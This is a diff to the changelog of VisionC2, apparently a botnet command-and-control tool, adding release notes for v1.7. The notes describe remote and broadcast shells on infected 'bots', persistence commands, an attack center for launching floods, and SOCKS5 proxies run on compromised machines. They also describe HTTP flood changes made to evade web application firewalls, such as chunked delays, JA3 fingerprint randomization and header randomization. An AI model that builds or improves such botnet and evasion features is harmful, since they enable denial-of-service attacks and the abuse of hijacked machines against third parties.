@@ -5,6 +5,97 @@ All notable changes to **VisionC2** are documented below.
 
 ---
 
+### v1.7 — February 2026
+
+#### 🎨 Full TUI Control Panel (BubbleTea)
+
+* **Complete Terminal User Interface**
+  * Interactive dashboard with real-time bot stats and gradient ASCII banner
+  * No telnet/netcat required — TUI is now the default mode
+  * `./cnc` starts TUI, `./cnc --split` for legacy telnet mode
+
+* **Bot Management View**
+  * Real-time bot list with ID, IP, Architecture, RAM, and Uptime
+  * Direct shell access to individual bots via `[enter]`
+  * Bot commands: `[i]` Info, `[p]` Persist, `[r]` Reinstall, `[k]` Kill
+
+* **Remote Shell**
+  * Interactive shell session with single bot
+  * Command history support
+  * Hotkeys: `Ctrl+F` Clear, `Ctrl+P` Persist, `Ctrl+R` Reinstall
+
+* **Broadcast Shell**
+  * Execute commands on ALL bots simultaneously
+  * Targeting filters:
+    * `Ctrl+A` — Filter by architecture (amd64, arm64, mips, etc.)
+    * `Ctrl+G` — Filter by minimum RAM
+    * `Ctrl+B` — Limit max number of bots
+  * Confirmation prompts for dangerous broadcast commands
+
+* **Attack Center (Consolidated)**
+  * Two-tab interface: `[⚡ Launch]` and `[📊 Ongoing]`
+  * Interactive attack form with method picker
+  * Live countdown timers and progress bars for ongoing attacks
+  * `[s]` Stop all attacks from Ongoing tab
+  * Auto-reset form fields after launching attack
+
+* **SOCKS5 Manager**
+  * View all bots with socks status (Active/Stopped/None)
+  * `[s]` Start socks on selected bot (just enter port, binds to 0.0.0.0)
+  * `[x]` Stop socks on selected bot
+  * Three view modes: All Bots, Active Socks, Stopped
+
+* **Connection Logs**
+  * Full history of bot connects/disconnects
+  * Filter by: All, Connections only, Disconnections only
+
+* **Toast Notifications**
+  * Non-blocking notifications for attack launches, stops, and actions
+  * Auto-expire after 3-4 seconds
+
+#### 🔧 HTTP/Layer 7 Optimizations
+
+* **Connection Pooling & Keep-Alive**
+  * Reuses TCP connections across requests
+  * HTTP/2 multiplexing support
+  * Configurable idle connection limits
+
+* **Chunked Request Body**
+  * Randomized chunk sizes (512B–2KB)
+  * Delays between chunks to evade WAF detection
+
+* **JA3 Fingerprint Randomization**
+  * Randomized TLS cipher suites per connection
+  * Mimics diverse browser fingerprints
+
+* **Header Randomization**
+  * Random order of HTTP headers
+  * Varied Accept-Encoding, Accept-Language values
+
+* **Realistic Request Patterns**
+  * Random delays between requests (10-100ms)
+  * Referrer chain simulation
+  * Cookie persistence across requests
+
+#### 📚 Documentation
+
+* **USAGE.md Rewritten**
+  * Full TUI documentation with view screenshots
+  * Updated startup instructions (TUI default)
+  * Hotkey reference for each view
+
+* **COMMANDS.md Rewritten**
+  * Complete TUI hotkey reference
+  * Quick reference card
+  * Split mode commands for backwards compatibility
+
+* **README.md Updated**
+  * TUI feature highlight at top
+  * Updated Quick Start for TUI mode
+  * Moved TUI from roadmap to "Recently Completed"
+
+---
+
 ### v1.6 — February 2026
 
 #### 🔧 Core Improvements
@@ -138,6 +229,7 @@ All notable changes to **VisionC2** are documented below.
 
 | Version | Date     | Highlights                                         |
 | ------- | -------- | ---------------------------------------------------|
+| v1.7    | Feb 2026 | Full TUI panel, HTTP optimizations, consolidated UI|
 | v1.6    | Feb 2026 | DoH-first target resolve, persist fix, UI overhaul |
 | v1.5    | Feb 2026 | UPX stripping, docs, +50 user agents               |
 | v1.4    | Jan 2026 | Proxy support for Layer 7                          |
